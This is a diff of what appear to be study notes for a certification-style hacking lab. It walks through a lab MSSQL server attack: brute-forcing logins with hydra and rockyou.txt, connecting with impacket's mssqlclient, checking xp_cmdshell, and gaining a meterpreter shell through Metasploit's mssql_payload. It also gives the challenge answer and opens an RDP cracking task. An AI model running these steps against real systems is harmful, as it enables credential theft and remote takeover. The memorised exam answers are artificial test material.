@@ -178,16 +178,17 @@ A client machine under the target domain controller has a misconfigured SQL serv
 3.	hydra -U username.txt -P password.txt 192.168.10.144 mssql   ****users.txt and rockyou.txt // hydra -L users.txt -P rockyou.txt 192.168.10.144 mssql
 4.	user = Server_mssrv  and Password = Spidy
 5.	 python3 /Ad-tools/impacket/examples/mssqlclient.py SKILL.com/Server_mssrv:Spidy@192.168.10.144  -port 1433
+     ****python3 impacket/examples/mssqlclient.py SKILL.CEH/Server_mssrv:Spidy@192.168.10.144  -port 1433
 6.	Then type this [ SELECT name, CONVERT(INT, ISNULL(value, value_in_use)) AS IsConfigured FROM sys.configurations WHERE name='xp_cmdshell'; ]
 7.	type exit.
-8.	Goto msfconsole
-9.	▪ use exploit/windows/mssql/mssql_payload ▪ set RHOST 192.168.10.144 ▪ set USERNAME Server_mssrv ▪ set PASSWORD Spidy ▪ set DATABASE msdb
+8.	Goto ***type msfconsole
+9.	Type *** use exploit/windows/mssql/mssql_payload ▪ set RHOST 192.168.10.144 ▪ set USERNAME Server_mssrv ▪ set PASSWORD Spidy ▪ set DATABASE msdb
 10.	Exploit
 11.	In meterpreter, type shell
 12.	type cd /Users/Public/Downloads/  and type dir
 13.	note the size of MSS.txt
 
-Answer: 7 (Note: You can also crack ftp but this is the correct method to pass exam.)
+Answer: 7bytes (Note: You can also crack ftp but this is the correct method to pass exam.)
 
 **Challenge** 9:
 You are assigned to crack RDP credentials of user Maurice from the target subnet 192.168.10.0/24 and determine the password as answer. Note: use Note: use users.txt and rockyou.txt files stored in attacker home directory while cracking the credentials. (Format: Aaaaaaa@NNNN)
